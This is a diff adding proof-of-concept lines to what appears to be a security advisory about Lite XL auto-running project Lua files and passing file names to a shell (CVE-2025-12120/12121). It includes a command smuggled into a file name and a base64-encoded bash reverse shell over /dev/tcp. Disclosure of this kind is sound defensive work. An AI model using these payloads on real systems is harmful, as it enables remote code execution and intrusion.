@@ -17,6 +17,9 @@ When Lite XL opens a project directory it automatically executes the .lite_proje
 
 PoC:
 
+```
+os.execute("touch /tmp/hello.txt")
+```
 
 Put this into .lite_project.lua and save it; you should see /tmp/hello.txt created. This issue is similar for the user config file ~/.config/lite-xl/init.lua. Additionally, Lite XL’s “Core: Open User Module” command opens the init.lua file, making it easy to place code there.
 
@@ -31,10 +34,13 @@ They are different code paths, but all rely on system.exec() passing user input 
 
 PoC:
 
-Create a file named  and open it in Lite XL — you should see hello.txt created. If you push this further you could get a reverse shell by using a filename that decodes and runs a payload; for example:
+Create a file named $(touch hello.txt) and open it in Lite XL — you should see hello.txt created. If you push this further you could get a reverse shell by using a filename that decodes and runs a payload; for example:
 
+```
+$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash)
+```
 
-That base64 decodes to 
+That base64 decodes to `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
 
 ## References
 
@@ -43,3 +49,4 @@ That base64 decodes to
 - https://github.com/lite-xl/lite-xl/pull/1473
 - https://www.cve.org/CVERecord?id=CVE-2025-12120
 - https://www.cve.org/CVERecord?id=CVE-2025-12121
+
